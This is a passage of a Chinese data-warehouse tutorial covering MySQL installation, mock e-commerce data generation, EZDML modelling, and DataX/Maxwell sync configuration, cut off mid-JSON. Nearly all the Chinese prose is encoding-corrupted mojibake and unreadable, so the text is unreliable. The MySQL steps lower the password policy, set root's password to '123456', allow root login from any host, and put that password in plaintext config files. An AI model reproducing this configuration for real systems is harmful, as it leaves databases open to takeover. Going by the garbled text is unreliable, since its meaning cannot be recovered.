</td></tr><tr><td>name</td><td>ç”¨æˆ·å§“å</td></tr><tr><td>phone_num</td><td>æ‰‹æœºå·</td></tr><tr><td>email</td><td>é‚®ç®±</td></tr><tr><td>head_img</td><td>å¤´åƒ</td></tr><tr><td>user_level</td><td>ç”¨æˆ·çº§åˆ«</td></tr><tr><td>birthday</td><td>ç”¨æˆ·ç”Ÿæ—¥</td></tr><tr><td>gender</td><td>æ€§åˆ« Mç”·,Få¥³</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>operate_time</td><td>ä¿®æ”¹æ—¶é—´</td></tr><tr><td>status</td><td>çŠ¶æ€</td></tr></tbody></table><h3 id="æ¨¡æ‹Ÿç”Ÿæˆä¸šåŠ¡æ•°æ®"><a href="#æ¨¡æ‹Ÿç”Ÿæˆä¸šåŠ¡æ•°æ®" class="headerlink" title="æ¨¡æ‹Ÿç”Ÿæˆä¸šåŠ¡æ•°æ®"></a>æ¨¡æ‹Ÿç”Ÿæˆä¸šåŠ¡æ•°æ®</h3><h4 id="MySQLå®‰è£…"><a href="#MySQLå®‰è£…" class="headerlink" title="MySQLå®‰è£…"></a>MySQLå®‰è£…</h4><p><strong>1ï¼‰å®‰è£…åŒ…å‡†å¤‡</strong></p><p><strong>ï¼ˆ1ï¼‰å¸è½½è‡ªå¸¦çš„Mysql-libsï¼ˆå¦‚æœä¹‹å‰å®‰è£…è¿‡mysqlï¼Œè¦å…¨éƒ½å¸è½½æ‰ï¼‰</strong></p><p>[atguigu@hadoop102 software]$ rpm -qa | grep -i -E mysql\|mariadb | xargs<br>-n1 sudo rpm -e â€“nodeps</p><p><strong>ï¼ˆ2ï¼‰å°†å®‰è£…åŒ…å’ŒJDBCé©±åŠ¨ä¸Šä¼ åˆ°/opt/softwareï¼Œå…±è®¡6ä¸ª</strong></p><p>01_mysql-community-common-5.7.16-1.el7.x86_64.rpm</p><p>02_mysql-community-libs-5.7.16-1.el7.x86_64.rpm</p><p>03_mysql-community-libs-compat-5.7.16-1.el7.x86_64.rpm</p><p>04_mysql-community-client-5.7.16-1.el7.x86_64.rpm</p><p>05_mysql-community-server-5.7.16-1.el7.x86_64.rpm</p><p>mysql-connector-java-5.1.27-bin.jar</p><p><strong>2ï¼‰å®‰è£…MySQL</strong></p><p><strong>ï¼ˆ1ï¼‰å®‰è£…mysqlä¾èµ–</strong></p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>01_mysql-community-common-5.7.16-1.el7.x86_64.rpm</p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>02_mysql-community-libs-5.7.16-1.el7.x86_64.rpm</p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>03_mysql-community-libs-compat-5.7.16-1.el7.x86_64.rpm</p><p><strong>ï¼ˆ2ï¼‰å®‰è£…mysql-client</strong></p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>04_mysql-community-client-5.7.16-1.el7.x86_64.rpm</p><p><strong>ï¼ˆ3ï¼‰å®‰è£…mysql-server</strong></p><p>[atguigu@hadoop102 software]$ sudo rpm -ivh<br>05_mysql-community-server-5.7.16-1.el7.x86_64.rpm</p><p><strong>ï¼ˆ4ï¼‰å¯åŠ¨mysql</strong></p><p>[atguigu@hadoop102 software]$ sudo systemctl start mysqld</p><p><strong>ï¼ˆ5ï¼‰æŸ¥çœ‹mysqlå¯†ç </strong></p><p>[atguigu@hadoop102 software]$ sudo cat /var/log/mysqld.log | grep password</p><p><strong>3ï¼‰é…ç½®MySQL</strong></p><p>é…ç½®åªè¦æ˜¯rootç”¨æˆ·+å¯†ç ï¼Œåœ¨ä»»ä½•ä¸»æœºä¸Šéƒ½èƒ½ç™»å½•MySQLæ•°æ®åº“ã€‚</p><p><strong>ï¼ˆ1ï¼‰ç”¨åˆšåˆšæŸ¥åˆ°çš„å¯†ç è¿›å…¥mysqlï¼ˆå¦‚æœæŠ¥é”™ï¼Œç»™å¯†ç åŠ å•å¼•å·ï¼‰</strong></p><p>[atguigu@hadoop102 software]$ mysql -uroot -pâ€™passwordâ€™</p><p><strong>ï¼ˆ2ï¼‰è®¾ç½®å¤æ‚å¯†ç (ç”±äºmysqlå¯†ç ç­–ç•¥ï¼Œæ­¤å¯†ç å¿…é¡»è¶³å¤Ÿå¤æ‚)</strong></p><p>mysql&gt; set password=password(â€œQs23=zs32â€);</p><p><strong>ï¼ˆ3ï¼‰æ›´æ”¹mysqlå¯†ç ç­–ç•¥</strong></p><p>mysql&gt; set global validate_password_length=4;</p><p>mysql&gt; set global validate_password_policy=0;</p><p><strong>ï¼ˆ4ï¼‰è®¾ç½®ç®€å•å¥½è®°çš„å¯†ç </strong></p><p>mysql&gt; set password=password(â€œ123456â€);</p><p><strong>ï¼ˆ5ï¼‰è¿›å…¥msyqlåº“</strong></p><p>mysql&gt; use mysql</p><p><strong>ï¼ˆ6ï¼‰æŸ¥è¯¢userè¡¨</strong></p><p>mysql&gt; select user, host from user;</p><p><strong>ï¼ˆ7ï¼‰ä¿®æ”¹userè¡¨ï¼ŒæŠŠHostè¡¨å†…å®¹ä¿®æ”¹ä¸º%</strong></p><p>mysql&gt; update user set host=â€%â€ where user=â€rootâ€;</p><p><strong>ï¼ˆ8ï¼‰åˆ·æ–°</strong></p><p>mysql&gt; flush privileges;</p><p><strong>ï¼ˆ9ï¼‰é€€å‡º</strong></p><p>mysql&gt; quit;</p><h4 id="ä¸šåŠ¡æ•°æ®ç”Ÿæˆ"><a href="#ä¸šåŠ¡æ•°æ®ç”Ÿæˆ" class="headerlink" title="ä¸šåŠ¡æ•°æ®ç”Ÿæˆ"></a>ä¸šåŠ¡æ•°æ®ç”Ÿæˆ</h4><p><strong>1ï¼‰è¿æ¥MySQL</strong></p><p>é€šè¿‡MySQLå¯è§†åŒ–å®¢æˆ·ç«¯è¿æ¥æ•°æ®åº“ã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/e6d30df4632678c5074c181e254ea131.png"></p><p><strong>2ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>ï¼ˆ1ï¼‰é€šè¿‡SQLyogåˆ›å»ºæ•°æ®åº“</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/608c561af4283cb360b540194ed9ca3a.png"></p><p>ï¼ˆ2ï¼‰è®¾ç½®æ•°æ®åº“åç§°ä¸º<strong>gmall</strong>ï¼Œç¼–ç ä¸º<strong>utf-8</strong>ï¼Œ<strong>æ’åºè§„åˆ™</strong>ä¸ºutf8_general_ci</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/a8fb4801bb8c3dbfdced378e4200fe47.png"></p><p>ï¼ˆ3ï¼‰å¯¼å…¥æ•°æ®åº“ç»“æ„è„šæœ¬ï¼ˆ<strong>gmall.sql</strong>ï¼‰</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/beab5148b90a7ffd3b230d60988e7561.png"></p><p>æ³¨æ„ï¼šå®Œæˆåï¼Œè¦è®°å¾—å³é”®ï¼Œåˆ·æ–°ä¸€ä¸‹å¯¹è±¡æµè§ˆå™¨ï¼Œå°±å¯ä»¥çœ‹è§æ•°æ®åº“ä¸­çš„è¡¨äº†ã€‚</p><p><strong>3ï¼‰ç”Ÿæˆä¸šåŠ¡æ•°æ®</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/opt/module/ç›®å½•ä¸‹åˆ›å»ºdb_logæ–‡ä»¶å¤¹</p><p>[atguigu@hadoop102 module]$ mkdir db_log/</p><p>ï¼ˆ2ï¼‰æŠŠgmall2020-mock-db-2021-11-14.jarå’Œapplication.propertiesä¸Šä¼ åˆ°hadoop102çš„/opt/module/db_logè·¯å¾„ä¸Šã€‚</p><p>ï¼ˆ3ï¼‰æ ¹æ®éœ€æ±‚ä¿®æ”¹application.propertiesç›¸å…³é…ç½®</p><p>logging.level.root=info</p><p>spring.datasource.driver-class-name=com.mysql.jdbc.Driver</p><p>spring.datasource.url=jdbc:mysql://hadoop102:3306/gmall?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</p><p>spring.datasource.username=root</p><p>spring.datasource.password=123456</p><p>logging.pattern.console=%m%n</p><p>mybatis-plus.global-config.db-config.field-strategy=not_null</p><p>mybatis.mapperLocations=classpath:mapper/*.xml</p><p>##ä¸šåŠ¡æ—¥æœŸ</p><p>mock.date=2020-06-14</p><p>##æ˜¯å¦é‡ç½®ï¼Œé¦–æ—¥é¡»è®¾ç½®ä¸º1</p><p>mock.clear=1</p><p>##æ˜¯å¦é‡ç½®ç”¨æˆ·ï¼Œé¦–æ—¥é¡»è®¾ç½®ä¸º1</p><p>mock.clear.user=1</p><p>##ç”Ÿæˆæ–°ç”¨æˆ·æ•°é‡</p><p>mock.user.count=200</p><p>##ç”·æ€§æ¯”ä¾‹</p><p>mock.user.male-rate=20</p><p>##ç”¨æˆ·æ•°æ®å˜åŒ–æ¦‚ç‡</p><p>mock.user.update-rate:20</p><p>##æ”¶è—å–æ¶ˆæ¯”ä¾‹</p><p>mock.favor.cancel-rate=10</p><p>##æ”¶è—æ•°é‡</p><p>mock.favor.count=100</p><p>##æ¯ä¸ªç”¨æˆ·æ·»åŠ è´­ç‰©è½¦çš„æ¦‚ç‡</p><p>mock.cart.user-rate=10</p><p>##æ¯æ¬¡æ¯ä¸ªç”¨æˆ·æœ€å¤šæ·»åŠ å¤šå°‘ç§å•†å“è¿›è´­ç‰©è½¦</p><p>mock.cart.max-sku-count=8</p><p>##æ¯ä¸ªå•†å“æœ€å¤šä¹°å‡ ä¸ª</p><p>mock.cart.max-sku-num=3</p><p>##è´­ç‰©è½¦æ¥æº ç”¨æˆ·æŸ¥è¯¢ï¼Œå•†å“æ¨å¹¿ï¼Œæ™ºèƒ½æ¨è, ä¿ƒé”€æ´»åŠ¨</p><p>mock.cart.source-type-rate=60:20:10:10</p><p>##ç”¨æˆ·ä¸‹å•æ¯”ä¾‹</p><p>mock.order.user-rate=30</p><p>##ç”¨æˆ·ä»è´­ç‰©ä¸­è´­ä¹°å•†å“æ¯”ä¾‹</p><p>mock.order.sku-rate=50</p><p>##æ˜¯å¦å‚åŠ æ´»åŠ¨</p><p>mock.order.join-activity=1</p><p>##æ˜¯å¦ä½¿ç”¨è´­ç‰©åˆ¸</p><p>mock.order.use-coupon=1</p><p>##è´­ç‰©åˆ¸é¢†å–äººæ•°</p><p>mock.coupon.user-count=100</p><p>##æ”¯ä»˜æ¯”ä¾‹</p><p>mock.payment.rate=70</p><p>##æ”¯ä»˜æ–¹å¼ æ”¯ä»˜å®ï¼šå¾®ä¿¡ ï¼šé“¶è”</p><p>mock.payment.payment-type=30:60:10</p><p>##è¯„ä»·æ¯”ä¾‹ å¥½ï¼šä¸­ï¼šå·®ï¼šè‡ªåŠ¨</p><p>mock.comment.appraise-rate=30:10:10:50</p><p>##é€€æ¬¾åŸå› æ¯”ä¾‹ï¼šè´¨é‡é—®é¢˜ å•†å“æè¿°ä¸å®é™…æè¿°ä¸ä¸€è‡´ ç¼ºè´§ å·ç ä¸åˆé€‚ æ‹é”™ ä¸æƒ³ä¹°äº†<br>å…¶ä»–</p><p>mock.refund.reason-rate=30:10:20:5:15:5:5</p><p>logging.level.com.atguigu.gmall2020.mock.db.mapper=debug</p><p>ï¼ˆ4ï¼‰å¹¶åœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œï¼Œå¦‚ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆ2020-06-14æ—¥æœŸæ•°æ®ï¼š</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-11-14.jar</p><p>ï¼ˆ5ï¼‰æŸ¥çœ‹gmallæ•°æ®åº“ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰2020-06-14çš„æ•°æ®å‡ºç°</p><h4 id="ä¸šåŠ¡æ•°æ®æ¢³ç†å·¥å…·"><a href="#ä¸šåŠ¡æ•°æ®æ¢³ç†å·¥å…·" class="headerlink" title="ä¸šåŠ¡æ•°æ®æ¢³ç†å·¥å…·"></a>ä¸šåŠ¡æ•°æ®æ¢³ç†å·¥å…·</h4><p>å¯å€ŸåŠ©EZDMLè¿™æ¬¾æ•°æ®åº“è®¾è®¡å·¥å…·ï¼Œæ¥è¾…åŠ©æˆ‘ä»¬æ¢³ç†å¤æ‚çš„ä¸šåŠ¡è¡¨å…³ç³»ã€‚</p><p><strong>1ï¼‰ä¸‹è½½åœ°å€</strong></p><p><a href="http://www.ezdml.com/download_cn.html">http://www.ezdml.com/download_cn.html</a></p><p><strong>2ï¼‰ä½¿ç”¨è¯´æ˜</strong></p><p><strong>ï¼ˆ1ï¼‰æ–°å»ºæ¨¡å‹</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/13c9f92549815e54873688c709a8a617.png"></p><p><strong>ï¼ˆ2ï¼‰å‘½åæ¨¡å‹</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/9c71f327282e0ac01057637ebf8b13af.png"></p><p><strong>ï¼ˆ3ï¼‰ç‚¹å‡»å›¾æ ‡ï¼Œé€‰ä¸­æ¨¡å‹</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/4e53f5f77851207982d863ee0319f736.png"></p><p><strong>ï¼ˆ4ï¼‰å¯¼å…¥æ•°æ®åº“</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/4788144b3bc4b90f08c4a3bbce7e142b.png"></p><p><strong>ï¼ˆ5ï¼‰é…ç½®æ•°æ®åº“è¿æ¥</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b4e9f0c09de5ab69fc308aac085004bf.png"></p><p><strong>ï¼ˆ6ï¼‰é€‰æ‹©å¯¼å…¥çš„è¡¨ï¼ˆæ ‡æ³¨çº¢ç‚¹çš„è¡¨ä¸éœ€è¦å¯¼å…¥ï¼‰</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/3a0264f0583c3c1c35d9b661fb5f98b8.png"></p><p><strong>ï¼ˆ7ï¼‰å»ºç«‹è¡¨å…³ç³»</strong></p><p>ç¬¬ä¸€æ­¥ï¼šç‚¹å‡»é€‰ä¸­ä¸»è¡¨ï¼ˆä¸»é”®æ‰€åœ¨çš„è¡¨ï¼‰</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/00565aa6006fa74c1aa1da5291bda3bc.png"></p><p>ç¬¬äºŒæ­¥ï¼šç‚¹å‡»è¿æ¥æŒ‰é’®</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b7f840e6e1b5d8aad421a43813286595.png"></p><p>ç¬¬ä¸‰æ­¥ï¼šç‚¹å‡»ä»è¡¨ï¼Œé…ç½®è¿æ¥æ¡ä»¶</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/5fd6523014bf249a216aab4b0ae0accf.png"></p><p>ç¬¬å››æ­¥ï¼šæ•ˆæœå±•ç¤º</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/3a8de202d869fc191401b8a8f9bdb185.png"></p><p><strong>3ï¼‰ä½¿ç”¨æŠ€å·§</strong></p><p><strong>ï¼ˆ1ï¼‰ç¼©ç•¥å›¾</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/1f533040e32ff8a4b4c9925e5ccd7dab.png"></p><p><strong>ï¼ˆ2ï¼‰çƒ­é”®</strong></p><p>æŒ‰ä½shifté”®ï¼Œç”¨é¼ æ ‡ç‚¹å‡»è¡¨ï¼Œè¿›è¡Œå¤šé€‰ï¼Œå¯å®ç°æ‰¹é‡ç§»åŠ¨</p><p>æŒ‰ä½ctrlé”®ï¼Œç”¨é¼ æ ‡åœˆé€‰è¡¨ï¼Œä¹Ÿå¯è¿›è¡Œå¤šé€‰ï¼Œå®ç°æ‰¹é‡ç§»åŠ¨</p><h2 id="ç¬¬3ç« -ä¸šåŠ¡æ•°æ®é‡‡é›†æ¨¡å—"><a href="#ç¬¬3ç« -ä¸šåŠ¡æ•°æ®é‡‡é›†æ¨¡å—" class="headerlink" title="ç¬¬3ç«  ä¸šåŠ¡æ•°æ®é‡‡é›†æ¨¡å—"></a>ç¬¬3ç«  ä¸šåŠ¡æ•°æ®é‡‡é›†æ¨¡å—</h2><h3 id="ä¸šåŠ¡æ•°æ®åŒæ­¥æ¦‚è¿°"><a href="#ä¸šåŠ¡æ•°æ®åŒæ­¥æ¦‚è¿°" class="headerlink" title="ä¸šåŠ¡æ•°æ®åŒæ­¥æ¦‚è¿°"></a>ä¸šåŠ¡æ•°æ®åŒæ­¥æ¦‚è¿°</h3><h4 id="æ•°æ®åŒæ­¥ç­–ç•¥æ¦‚è¿°"><a href="#æ•°æ®åŒæ­¥ç­–ç•¥æ¦‚è¿°" class="headerlink" title="æ•°æ®åŒæ­¥ç­–ç•¥æ¦‚è¿°"></a>æ•°æ®åŒæ­¥ç­–ç•¥æ¦‚è¿°</h4><p>ä¸šåŠ¡æ•°æ®æ˜¯æ•°æ®ä»“åº“çš„é‡è¦æ•°æ®æ¥æºï¼Œæˆ‘ä»¬éœ€è¦æ¯æ—¥å®šæ—¶ä»ä¸šåŠ¡æ•°æ®åº“ä¸­æŠ½å–æ•°æ®ï¼Œä¼ è¾“åˆ°æ•°æ®ä»“åº“ä¸­ï¼Œä¹‹åå†å¯¹æ•°æ®è¿›è¡Œåˆ†æç»Ÿè®¡ã€‚</p><p>ä¸ºä¿è¯ç»Ÿè®¡ç»“æœçš„æ­£ç¡®æ€§ï¼Œéœ€è¦ä¿è¯æ•°æ®ä»“åº“ä¸­çš„æ•°æ®ä¸ä¸šåŠ¡æ•°æ®åº“æ˜¯åŒæ­¥çš„ï¼Œç¦»çº¿æ•°ä»“çš„è®¡ç®—å‘¨æœŸé€šå¸¸ä¸ºå¤©ï¼Œæ‰€ä»¥æ•°æ®åŒæ­¥å‘¨æœŸä¹Ÿé€šå¸¸ä¸ºå¤©ï¼Œå³æ¯å¤©åŒæ­¥ä¸€æ¬¡å³å¯ã€‚</p><p>æ•°æ®çš„åŒæ­¥ç­–ç•¥æœ‰<strong>å…¨é‡åŒæ­¥</strong>å’Œ<strong>å¢é‡åŒæ­¥</strong>ã€‚</p><p><strong>å…¨é‡åŒæ­¥</strong>ï¼Œå°±æ˜¯æ¯å¤©éƒ½å°†ä¸šåŠ¡æ•°æ®åº“ä¸­çš„å…¨éƒ¨æ•°æ®åŒæ­¥ä¸€ä»½åˆ°æ•°æ®ä»“åº“ï¼Œè¿™æ˜¯ä¿è¯ä¸¤ä¾§æ•°æ®åŒæ­¥çš„æœ€ç®€å•çš„æ–¹å¼ã€‚</p><p><strong>å¢é‡åŒæ­¥</strong>ï¼Œå°±æ˜¯æ¯å¤©åªå°†ä¸šåŠ¡æ•°æ®ä¸­çš„æ–°å¢åŠå˜åŒ–æ•°æ®åŒæ­¥åˆ°æ•°æ®ä»“åº“ã€‚é‡‡ç”¨æ¯æ—¥å¢é‡åŒæ­¥çš„è¡¨ï¼Œé€šå¸¸éœ€è¦åœ¨é¦–æ—¥å…ˆè¿›è¡Œä¸€æ¬¡å…¨é‡åŒæ­¥ã€‚</p><h4 id="æ•°æ®åŒæ­¥ç­–ç•¥é€‰æ‹©"><a href="#æ•°æ®åŒæ­¥ç­–ç•¥é€‰æ‹©" class="headerlink" title="æ•°æ®åŒæ­¥ç­–ç•¥é€‰æ‹©"></a>æ•°æ®åŒæ­¥ç­–ç•¥é€‰æ‹©</h4><p>ä¸¤ç§ç­–ç•¥éƒ½èƒ½ä¿è¯æ•°æ®ä»“åº“å’Œä¸šåŠ¡æ•°æ®åº“çš„æ•°æ®åŒæ­¥ï¼Œé‚£åº”è¯¥å¦‚ä½•é€‰æ‹©å‘¢ï¼Ÿä¸‹é¢å¯¹ä¸¤ç§ç­–ç•¥è¿›è¡Œç®€è¦å¯¹æ¯”ã€‚</p><table><thead><tr><th>åŒæ­¥ç­–ç•¥</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>å…¨é‡åŒæ­¥</td><td>é€»è¾‘ç®€å•</td><td>åœ¨æŸäº›æƒ…å†µä¸‹æ•ˆç‡è¾ƒä½ã€‚ä¾‹å¦‚æŸå¼ è¡¨æ•°æ®é‡è¾ƒå¤§ï¼Œä½†æ˜¯æ¯å¤©æ•°æ®çš„å˜åŒ–æ¯”ä¾‹å¾ˆä½ï¼Œè‹¥å¯¹å…¶é‡‡ç”¨æ¯æ—¥å…¨é‡åŒæ­¥ï¼Œåˆ™ä¼šé‡å¤åŒæ­¥å’Œå­˜å‚¨å¤§é‡ç›¸åŒçš„æ•°æ®ã€‚</td></tr><tr><td>å¢é‡åŒæ­¥</td><td>æ•ˆç‡é«˜ï¼Œæ— éœ€åŒæ­¥å’Œå­˜å‚¨é‡å¤æ•°æ®</td><td>é€»è¾‘å¤æ‚ï¼Œéœ€è¦å°†æ¯æ—¥çš„æ–°å¢åŠå˜åŒ–æ•°æ®åŒåŸæ¥çš„æ•°æ®è¿›è¡Œæ•´åˆï¼Œæ‰èƒ½ä½¿ç”¨</td></tr></tbody></table><p>æ ¹æ®ä¸Šè¿°å¯¹æ¯”ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š</p><p>è‹¥ä¸šåŠ¡è¡¨æ•°æ®é‡æ¯”è¾ƒå¤§ï¼Œä¸”æ¯å¤©æ•°æ®å˜åŒ–çš„æ¯”ä¾‹æ¯”è¾ƒä½ï¼Œè¿™æ—¶åº”é‡‡ç”¨å¢é‡åŒæ­¥ï¼Œå¦åˆ™å¯é‡‡ç”¨å…¨é‡åŒæ­¥ã€‚</p><p>ä¸‹å›¾ä¸ºå„è¡¨åŒæ­¥ç­–ç•¥ï¼š</p><p>æ³¨ï¼šç”±äºåç»­æ•°ä»“å»ºæ¨¡éœ€è¦ï¼Œcart_infoéœ€è¿›è¡Œå…¨é‡åŒæ­¥å’Œå¢é‡åŒæ­¥ï¼Œæ­¤å¤„æš‚ä¸è§£é‡Šï¼Œåç»­ç« èŠ‚ä¼šä½œå‡ºè§£é‡Šã€‚</p><h4 id="æ•°æ®åŒæ­¥å·¥å…·æ¦‚è¿°"><a href="#æ•°æ®åŒæ­¥å·¥å…·æ¦‚è¿°" class="headerlink" title="æ•°æ®åŒæ­¥å·¥å…·æ¦‚è¿°"></a>æ•°æ®åŒæ­¥å·¥å…·æ¦‚è¿°</h4><p>æ•°æ®åŒæ­¥å·¥å…·ç§ç±»ç¹å¤šï¼Œå¤§è‡´å¯åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯ä»¥DataXã€Sqoopä¸ºä»£è¡¨çš„åŸºäºSelectæŸ¥è¯¢çš„ç¦»çº¿ã€æ‰¹é‡åŒæ­¥å·¥å…·ï¼Œå¦ä¸€ç±»æ˜¯ä»¥Maxwellã€Canalä¸ºä»£è¡¨çš„åŸºäºæ•°æ®åº“æ•°æ®å˜æ›´æ—¥å¿—ï¼ˆä¾‹å¦‚MySQLçš„binlogï¼Œå…¶ä¼šå®æ—¶è®°å½•æ‰€æœ‰çš„insertã€updateä»¥åŠdeleteæ“ä½œï¼‰çš„å®æ—¶æµå¼åŒæ­¥å·¥å…·ã€‚</p><p>å…¨é‡åŒæ­¥é€šå¸¸ä½¿ç”¨DataXã€Sqoopç­‰åŸºäºæŸ¥è¯¢çš„ç¦»çº¿åŒæ­¥å·¥å…·ã€‚è€Œå¢é‡åŒæ­¥æ—¢å¯ä»¥ä½¿ç”¨DataXã€Sqoopç­‰å·¥å…·ï¼Œä¹Ÿå¯ä½¿ç”¨Maxwellã€Canalç­‰å·¥å…·ï¼Œä¸‹é¢å¯¹å¢é‡åŒæ­¥ä¸åŒæ–¹æ¡ˆè¿›è¡Œç®€è¦å¯¹æ¯”ã€‚</p><table><thead><tr><th>å¢é‡åŒæ­¥æ–¹æ¡ˆ</th><th>DataX/Sqoop</th><th>Maxwell/Canal</th></tr></thead><tbody><tr><td>å¯¹æ•°æ®åº“çš„è¦æ±‚</td><td>åŸç†æ˜¯åŸºäºæŸ¥è¯¢ï¼Œæ•…è‹¥æƒ³é€šè¿‡selectæŸ¥è¯¢è·å–æ–°å¢åŠå˜åŒ–æ•°æ®ï¼Œå°±è¦æ±‚æ•°æ®è¡¨ä¸­å­˜åœ¨create_timeã€update_timeç­‰å­—æ®µï¼Œç„¶åæ ¹æ®è¿™äº›å­—æ®µè·å–å˜æ›´æ•°æ®ã€‚</td><td>è¦æ±‚æ•°æ®åº“è®°å½•å˜æ›´æ“ä½œï¼Œä¾‹å¦‚MySQLéœ€å¼€å¯binlogã€‚</td></tr><tr><td>æ•°æ®çš„ä¸­é—´çŠ¶æ€</td><td>ç”±äºæ˜¯ç¦»çº¿æ‰¹é‡åŒæ­¥ï¼Œæ•…è‹¥ä¸€æ¡æ•°æ®åœ¨ä¸€å¤©ä¸­å˜åŒ–å¤šæ¬¡ï¼Œè¯¥æ–¹æ¡ˆåªèƒ½è·å–æœ€åä¸€ä¸ªçŠ¶æ€ï¼Œä¸­é—´çŠ¶æ€æ— æ³•è·å–ã€‚</td><td>ç”±äºæ˜¯å®æ—¶è·å–æ‰€æœ‰çš„æ•°æ®å˜æ›´æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥è·å–å˜æ›´æ•°æ®çš„æ‰€æœ‰ä¸­é—´çŠ¶æ€ã€‚</td></tr></tbody></table><p>æœ¬é¡¹ç›®ä¸­ï¼Œå…¨é‡åŒæ­¥é‡‡ç”¨DataXï¼Œå¢é‡åŒæ­¥é‡‡ç”¨Maxwellã€‚</p><h4 id="æ•°æ®åŒæ­¥å·¥å…·éƒ¨ç½²"><a href="#æ•°æ®åŒæ­¥å·¥å…·éƒ¨ç½²" class="headerlink" title="æ•°æ®åŒæ­¥å·¥å…·éƒ¨ç½²"></a>æ•°æ®åŒæ­¥å·¥å…·éƒ¨ç½²</h4><p><strong>1ï¼‰DataX</strong></p><p><strong>2ï¼‰Maxwell</strong></p><h3 id="å…¨é‡è¡¨æ•°æ®åŒæ­¥"><a href="#å…¨é‡è¡¨æ•°æ®åŒæ­¥" class="headerlink" title="å…¨é‡è¡¨æ•°æ®åŒæ­¥"></a>å…¨é‡è¡¨æ•°æ®åŒæ­¥</h3><h4 id="æ•°æ®é€šé“"><a href="#æ•°æ®é€šé“" class="headerlink" title="æ•°æ®é€šé“"></a>æ•°æ®é€šé“</h4><p>å…¨é‡è¡¨æ•°æ®ç”±DataXä»MySQLä¸šåŠ¡æ•°æ®åº“ç›´æ¥åŒæ­¥åˆ°HDFSï¼Œå…·ä½“æ•°æ®æµå‘å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><h4 id="DataXé…ç½®æ–‡ä»¶"><a href="#DataXé…ç½®æ–‡ä»¶" class="headerlink" title="DataXé…ç½®æ–‡ä»¶"></a>DataXé…ç½®æ–‡ä»¶</h4><p>æˆ‘ä»¬éœ€è¦ä¸ºæ¯å¼ å…¨é‡è¡¨ç¼–å†™ä¸€ä¸ªDataXçš„jsoné…ç½®æ–‡ä»¶ï¼Œæ­¤å¤„ä»¥activity_infoä¸ºä¾‹ï¼Œé…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><p>{</p><p>â€œjobâ€: {</p><p>â€œcontentâ€: [</p><p>{</p><p>â€œreaderâ€: {</p><p>â€œnameâ€: â€œmysqlreaderâ€,</p><p>â€œparameterâ€: {</p><p>â€œcolumnâ€: [</p><p>â€œidâ€,</p><p>â€œactivity_nameâ€,</p><p>â€œactivity_typeâ€,</p><p>â€œactivity_descâ€,</p><p>â€œstart_timeâ€,</p><p>â€œend_timeâ€,</p><p>â€œcreate_timeâ€</p><p>],</p><p>â€œconnectionâ€: [</p><p>{</p><p>â€œjdbcUrlâ€: [</p><p>â€œjdbc:mysql://hadoop102:3306/gmallâ€</p><p>],</p><p>â€œtableâ€: [</p><p>â€œactivity_infoâ€</p><p>]</p><p>}</p><p>],</p><p>â€œpasswordâ€: â€œ123456â€,</p><p>â€œsplitPkâ€: â€œâ€,</p><p>â€œusernameâ€: â€œrootâ€</p><p>}</p><p>},</p><p>â€œwriterâ€: {</p><p>â€œnameâ€: â€œhdfswriterâ€,</p><p>â€œparameterâ€: {</p><p>â€œcolumnâ€: [</p><p>{</p><p>â€œnameâ€: â€œidâ€,</p><p>â€œtypeâ€: â€œbigintâ€</p><p>},</p><p>{</p><p>â€œnameâ€: â€œactivity_nameâ€,</p><p>â€œtypeâ€: â€œstringâ€</p><p>},</p><p>{</p><p>â€œnameâ€: â€œactivity_typeâ€,</p><p>â€œtypeâ€: â€œstringâ€</p><p>},</p><p>{</p><p>â€œnameâ€: â€œactivity_descâ€,</p><p>â€œtypeâ€: â€œstringâ€</p><p>},</p><p>{</p><p>â€œnameâ€: â€œstart_timeâ€,</p><p>â€œtypeâ€: â€œstringâ€</p><p>},</p><p>{</p><p>â€œnameâ€: 